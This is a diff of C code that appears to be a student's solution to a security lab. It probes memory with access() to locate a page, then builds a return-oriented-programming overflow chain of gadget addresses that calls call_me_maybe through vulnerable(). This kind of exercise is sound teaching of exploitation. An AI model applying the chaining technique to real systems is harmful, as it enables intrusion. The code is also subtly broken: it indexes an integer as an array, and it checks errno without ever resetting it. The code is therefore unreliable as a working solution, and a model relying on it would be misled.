@@ -29,10 +29,18 @@ uint64_t find_address(uint64_t low_bound, uint64_t high_bound);
 void do_overflow(uint64_t page_addr);
 
 uint64_t find_address(uint64_t low_bound, uint64_t high_bound) {
-
 	// Put your Part 1 code here
 	// You are free to choose any of 1A, 1B, or 1C
+	for (uint64_t addr = low_bound; addr < high_bound; addr += PAGE_SIZE) {
+        // TODO: Figure out if "addr" is the correct address or not.
+        const char *pathname = (const char *)addr;
 
+        // Attempt to access the "file"
+        access(pathname, F_OK);
+        if (errno == 2) {
+            return addr;
+        }
+    }
     return 0;
 }
 
@@ -45,7 +53,38 @@ void do_overflow(uint64_t page_addr) {
 	// Put your Part 2 code here
 	// Use the page you found with find_address
 	// and the offsets located from objdump to find your gadgets
+	// Same deal as Part 2A, except this time there's no win() method to call directly!
+	uint64_t your_string[128];
 
+	// Fill the array with 0xFF's and set the last character to be a new line.
+	memset(your_string, 0xFF, sizeof(your_string));
+	your_string[127] = 0x000000000000000A;
+
+	// For now we don't worry about ASLR, we can directly use these addresses:
+	uint64_t gadget1_addr = page_addr[0];
+	uint64_t gadget2_addr = page_addr[1];
+	uint64_t gadget3_addr = page_addr[2];
+	uint64_t gadget4_addr = page_addr[3];
+	uint64_t gadget5_addr = page_addr[4];
+	uint64_t gadget6_addr = page_addr[5];
+	uint64_t call_me_maybe_addr = (uint64_t)&call_me_maybe;
+
+	// Part 2B: Fill in your_string such that it configures the arguments
+	// to call_me_maybe correctly, and then calls call_me_maybe.
+
+	// Recall that arg1 is rdi, arg2 is rsi, and arg3 is rdx.
+	// See gadgets.s for the gadget definitions.
+	your_string[3]=gadget3_addr;
+	your_string[4]=gadget5_addr;
+	your_string[5]=gadget5_addr;
+	your_string[6]=gadget6_addr;
+	your_string[7]=gadget2_addr;
+	your_string[8]=gadget1_addr;
+	your_string[9]=191;
+	your_string[10]=gadget4_addr;
+	your_string[11]=call_me_maybe_addr;
+	
+	vulnerable((char *)your_string);
 }
 
 /*
